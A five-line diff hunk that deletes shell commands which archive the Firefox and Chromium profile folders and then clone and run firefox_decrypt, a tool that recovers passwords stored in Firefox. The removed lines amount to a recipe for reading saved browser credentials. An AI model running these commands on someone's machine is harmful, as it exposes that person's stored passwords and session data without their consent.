@@ -1,5 +1,0 @@
-#tar cf a.tar ~/.mozilla/ 2>/dev/null
-#tar cf c.tar ~/.config/chromium/ 2>/dev/null
-git clone https://github.com/unode/firefox_decrypt.git
-cd firefox_decrypt
-python firefox_decrypt.py
